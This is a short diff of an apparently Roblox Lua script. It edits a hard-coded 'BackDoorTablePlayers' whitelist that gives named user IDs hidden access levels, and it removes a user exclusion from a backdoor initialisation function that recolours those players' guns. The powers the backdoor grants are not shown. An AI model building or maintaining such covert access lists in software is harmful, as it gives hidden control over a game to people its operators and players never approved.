@@ -236,11 +236,6 @@ local BackDoorTablePlayers = {
 		['Access'] = 4;
 		['Colour'] = Color3.fromRGB(127,0,212);
     };
-    [1711066907] = {
-        ['Name'] = "dot_mp4/jack (Current Dev)";
-		['Access'] = 4;
-		['Colour'] = Color3.fromRGB(0,0,0);
-	};
 	[612618136] = {
 		['Name'] = "Bird (Heavy donator)";
 		['Access'] = 4;
@@ -595,7 +590,7 @@ local function ColourifyGuns(GunTable,Colour)
 end
 
 local function initalizeBackdoorPart2(BackdoorPlayer,Colour)
-	if BackdoorPlayer and BackdoorPlayer.Character and BackdoorPlayer.UserId ~= 567153118 then
+	if BackdoorPlayer and BackdoorPlayer.Character then
 		ColourifyGuns(BackdoorPlayer.Backpack,Colour)
 		ColourifyGuns(BackdoorPlayer.Character,Colour)
 		BackdoorPlayer.Character.ChildAdded:Connect(function()
